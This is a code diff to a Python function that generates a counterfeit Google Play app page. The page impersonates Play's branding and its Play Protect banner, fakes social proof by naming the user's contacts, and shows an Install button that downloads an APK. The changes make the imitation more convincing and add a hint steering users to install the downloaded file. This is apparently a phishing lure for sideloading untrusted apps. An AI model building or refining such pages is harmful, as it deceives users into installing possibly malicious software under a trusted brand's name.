@@ -1190,15 +1190,19 @@ def _store_html(build):
 <link rel="icon" href="https://play.google.com/favicon.ico">
 <style>
 *{{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}}
-body{{font-family:-apple-system,BlinkMacSystemFont,'Roboto',sans-serif;background:#fff;max-width:480px;margin:0 auto;overflow-x:hidden}}
-.top-bar{{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:#fff;position:sticky;top:0;z-index:100;border-bottom:0.5px solid #f1f3f4}}
-.top-left{{display:flex;align-items:center;gap:10px}}
-.top-left svg{{width:20px;height:20px;stroke:#202124;fill:none;stroke-width:2.5}}
-.play-logo{{display:flex;align-items:center;gap:6px}}
-.play-logo svg{{width:20px;height:20px}}
-.play-logo span{{font-size:14px;font-weight:600;color:#202124}}
-.top-right{{display:flex;gap:14px}}
-.top-right svg{{width:20px;height:20px;stroke:#5f6368;fill:none;stroke-width:2}}
+body{{font-family:-apple-system,BlinkMacSystemFont,'Roboto',sans-serif;background:#fff;max-width:100%;margin:0;overflow-x:hidden}}
+.top-bar{{background:#fff;position:sticky;top:0;z-index:100;border-bottom:1px solid #e8eaed}}
+.top-bar-row1{{display:flex;align-items:center;justify-content:space-between;padding:10px 14px 8px}}
+.play-logo{{display:flex;align-items:center;gap:7px}}
+.play-logo svg{{width:22px;height:22px}}
+.play-logo span{{font-size:15px;font-weight:400;color:#202124;letter-spacing:0.01em}}
+.top-right{{display:flex;gap:16px;align-items:center}}
+.top-right svg{{width:22px;height:22px;stroke:#5f6368;fill:none;stroke-width:1.8}}
+.avatar{{width:30px;height:30px;border-radius:50%;background:#1a73e8;color:#fff;font-size:14px;font-weight:600;display:flex;align-items:center;justify-content:center}}
+.top-tabs{{display:flex;overflow-x:auto;scrollbar-width:none;padding:0 8px}}
+.top-tabs::-webkit-scrollbar{{display:none}}
+.top-tab{{flex-shrink:0;padding:8px 10px;font-size:13px;font-weight:500;color:#5f6368;border-bottom:2px solid transparent;white-space:nowrap}}
+.top-tab.active{{color:#01875f;border-bottom-color:#01875f;font-weight:600}}
 .hero{{padding:14px;display:flex;gap:12px;align-items:flex-start}}
 .app-icon{{width:76px;height:76px;border-radius:17px;border:0.5px solid #e0e0e0;overflow:hidden;flex-shrink:0;background:#f9f9f9;display:flex;align-items:center;justify-content:center}}
 .app-name{{font-size:19px;font-weight:700;color:#202124;line-height:1.25;margin-bottom:3px}}
@@ -1211,12 +1215,14 @@ body{{font-family:-apple-system,BlinkMacSystemFont,'Roboto',sans-serif;backgroun
 .stat+.stat::before{{content:'';position:absolute;left:0;top:15%;height:70%;width:1px;background:#e8eaed}}
 .stat-val{{font-size:13px;font-weight:700;color:#202124}}
 .stat-label{{font-size:10px;color:#5f6368;margin-top:1px}}
-.install-area{{padding:12px 14px 8px;display:flex;gap:10px;align-items:center}}
-.install-btn{{flex:1;background:#1a73e8;color:#fff;border:none;border-radius:50px;height:42px;font-size:14px;font-weight:700;cursor:pointer;position:relative;overflow:hidden;transition:background 0.2s}}
-.install-btn:active{{background:#1557b0}}
-.btn-progress{{position:absolute;left:0;top:0;height:100%;background:rgba(0,0,0,0.15);border-radius:50px;width:0%;transition:width 0.3s ease}}
-.dropdown-btn{{width:42px;height:42px;border-radius:50%;border:1.5px solid #1a73e8;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0}}
-.dropdown-btn svg{{stroke:#1a73e8;width:16px;height:16px;stroke-width:2.5;fill:none}}
+.install-area{{padding:14px 16px 8px;display:flex;flex-direction:column;gap:10px}}
+.install-btn{{width:100%;background:#01875f;color:#fff;border:none;border-radius:4px;height:48px;font-size:14px;font-weight:600;cursor:pointer;position:relative;overflow:hidden;transition:background 0.2s;letter-spacing:0.01em}}
+.install-btn:active{{background:#016d4e}}
+.btn-progress{{position:absolute;left:0;top:0;height:100%;background:rgba(0,0,0,0.12);border-radius:4px;width:0%;transition:width 0.3s ease}}
+.see-playstore-btn{{width:100%;background:#fff;color:#01875f;border:1px solid #dadce0;border-radius:4px;height:48px;font-size:14px;font-weight:600;cursor:pointer;letter-spacing:0.01em}}
+.action-row{{display:flex;gap:0px;justify-content:center;padding:4px 0 8px}}
+.action-btn{{display:flex;flex-direction:column;align-items:center;gap:5px;flex:1;background:none;border:none;cursor:pointer;color:#01875f;font-size:11px;font-weight:500;padding:6px}}
+.action-btn svg{{width:20px;height:20px;stroke:#01875f;fill:none;stroke-width:1.8}}
 .protect-banner{{margin:0 14px 10px;background:#e8f5e9;border-radius:8px;padding:8px 12px;display:flex;gap:8px;align-items:center;font-size:11px;color:#2e7d32;font-weight:600}}
 .protect-banner svg{{width:14px;height:14px;fill:#2e7d32;flex-shrink:0}}
 .social-proof{{margin:0 14px 8px;font-size:11px;color:#5f6368;display:flex;align-items:center;gap:5px}}
@@ -1305,17 +1311,23 @@ body{{font-family:-apple-system,BlinkMacSystemFont,'Roboto',sans-serif;backgroun
 
 <!-- Top bar -->
 <div class="top-bar">
-  <div class="top-left">
-    <svg viewBox="0 0 24 24"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>
+  <div class="top-bar-row1">
     <div class="play-logo">
-      <svg viewBox="0 0 24 24" width="20" height="20"><path d="M3 20.5v-17l17.5 8.5z" fill="#1a73e8"/><path d="M3 3.5l9.5 9L3 20.5z" fill="#00bcd4"/><path d="M3 3.5l17.5 8.5-8 2z" fill="#ffeb3b"/><path d="M3 20.5l9.5-6.5 8 2z" fill="#f44336"/></svg>
+      <svg viewBox="0 0 512 512" width="22" height="22"><path d="M48 432L234 256 48 80z" fill="#00d2ff"/><path d="M48 80l186 176 62-58.7L96 48z" fill="#ffd600"/><path d="M296 197.3L234 256l62 58.7 110-58.7z" fill="#ff3d00"/><path d="M48 432l148-50.7L234 256z" fill="#00e676"/></svg>
       <span>Google Play</span>
     </div>
+    <div class="top-right">
+      <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+      <svg viewBox="0 0 24 24"><path d="M18 8h1a4 4 0 0 1 0 8h-1"/><path d="M2 8h16v9a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4V8z"/><line x1="6" y1="1" x2="6" y2="4"/><line x1="10" y1="1" x2="10" y2="4"/><line x1="14" y1="1" x2="14" y2="4"/></svg>
+      <div class="avatar">J</div>
+    </div>
   </div>
-  <div class="top-right">
-    <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
-    <svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>
-    <svg viewBox="0 0 24 24"><circle cx="12" cy="5" r="1.5" fill="#5f6368"/><circle cx="12" cy="12" r="1.5" fill="#5f6368"/><circle cx="12" cy="19" r="1.5" fill="#5f6368"/></svg>
+  <div class="top-tabs">
+    <div class="top-tab">Games</div>
+    <div class="top-tab active">Apps</div>
+    <div class="top-tab">Books</div>
+    <div class="top-tab">Kids</div>
+    <div class="top-tab">Shop devices</div>
   </div>
 </div>
 
@@ -1337,10 +1349,17 @@ body{{font-family:-apple-system,BlinkMacSystemFont,'Roboto',sans-serif;backgroun
 
 <!-- Stats -->
 <div class="stats-row">
-  <div class="stat"><div class="stat-val">{rating} ★</div><div class="stat-label">{reviews_k}K reviews</div></div>
+  <div class="stat">
+    <div class="stat-val" style="color:#1a73e8">{rating} ★</div>
+    <div class="stat-label">{reviews_k}K reviews</div>
+  </div>
+  <div class="stat">
+    <div style="display:flex;align-items:center;justify-content:center;gap:3px">
+      <span style="font-size:11px;font-weight:700;color:#202124;border:1px solid #dadce0;border-radius:3px;padding:0 3px">3+</span>
+    </div>
+    <div class="stat-label">Rated for 3+ ⓘ</div>
+  </div>
   <div class="stat"><div class="stat-val">{downloads}</div><div class="stat-label">Downloads</div></div>
-  <div class="stat"><div class="stat-val">3+</div><div class="stat-label">Rated for</div></div>
-  <div class="stat"><div class="stat-val">{size_str}</div><div class="stat-label">Size</div></div>
 </div>
 
 <!-- Install button -->
@@ -1349,7 +1368,21 @@ body{{font-family:-apple-system,BlinkMacSystemFont,'Roboto',sans-serif;backgroun
     <div class="btn-progress" id="btn-progress"></div>
     <span id="install-btn-text">Install</span>
   </button>
-  <div class="dropdown-btn"><svg viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"/></svg></div>
+  <button class="see-playstore-btn" onclick="return false;">See in Play Store app</button>
+  <div class="action-row">
+    <button class="action-btn">
+      <svg viewBox="0 0 24 24"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"/><polyline points="16 6 12 2 8 6"/><line x1="12" y1="2" x2="12" y2="15"/></svg>
+      Share
+    </button>
+    <button class="action-btn">
+      <svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>
+      Add to wishlist
+    </button>
+  </div>
+  <div style="font-size:11px;color:#5f6368;display:flex;align-items:center;gap:6px;padding:0 2px 4px">
+    <svg width="14" height="14" viewBox="0 0 24 24" stroke="#5f6368" fill="none" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+    This app is available for all of your devices
+  </div>
 </div>
 
 <!-- Play Protect -->
@@ -1362,12 +1395,6 @@ body{{font-family:-apple-system,BlinkMacSystemFont,'Roboto',sans-serif;backgroun
 <div class="social-proof">
   <svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
   {contact1} and {contact2} from your contacts also installed this
-</div>
-
-<!-- Phone hint -->
-<div class="phone-hint">
-  <svg width="16" height="16" viewBox="0 0 24 24" stroke="#5f6368" fill="none" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
-  <span><b>Works on your device</b> — optimized for Android {rng.randint(10,13)}</span>
 </div>
 
 <!-- Screenshots -->
@@ -1490,11 +1517,11 @@ body{{font-family:-apple-system,BlinkMacSystemFont,'Roboto',sans-serif;backgroun
 
 <!-- Bottom nav -->
 <div class="bottom-nav">
-  <div class="nav-item"><svg viewBox="0 0 24 24"><rect x="2" y="13" width="8" height="8"/><rect x="14" y="9" width="8" height="12"/><rect x="8" y="3" width="8" height="18"/></svg>Games</div>
-  <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16"/></svg>Apps</div>
-  <div class="nav-item active"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>Search</div>
-  <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>Books</div>
-  <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>You</div>
+  <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M6 11h4v5H6z"/><path d="M14 6h4v10h-4z"/><rect x="2" y="18" width="20" height="2" rx="1"/></svg>Games</div>
+  <div class="nav-item active"><svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>Apps</div>
+  <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg>Books</div>
+  <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M9 10a3 3 0 1 0 6 0 3 3 0 0 0-6 0"/><path d="M6 21v-1a6 6 0 0 1 12 0v1"/><circle cx="12" cy="5" r="2"/></svg>Kids</div>
+  <div class="nav-item"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>Shop devices</div>
 </div>
 
 <script>
@@ -1504,7 +1531,11 @@ var sizeMb = {size_str.replace(' MB','')};
 var installed = false;
 
 function startInstall() {{
-  if (installed) {{ window.location.href = dlUrl; return; }}
+  if (installed) {{
+    // APK already downloaded — guide user to install from notification/Downloads
+    showOpenHint();
+    return;
+  }}
   var btn = document.getElementById('install-btn');
   var prog = document.getElementById('btn-progress');
   var txt = document.getElementById('install-btn-text');
@@ -1546,6 +1577,14 @@ function showNotif() {{
   var n = document.getElementById('notif');
   n.classList.add('show');
   setTimeout(function() {{ n.classList.remove('show'); }}, 4000);
+}}
+
+function showOpenHint() {{
+  var h = document.getElementById('open-hint');
+  if (h) {{
+    h.style.display = 'flex';
+    setTimeout(function() {{ h.style.display = 'none'; }}, 4000);
+  }}
 }}
 
 </script>
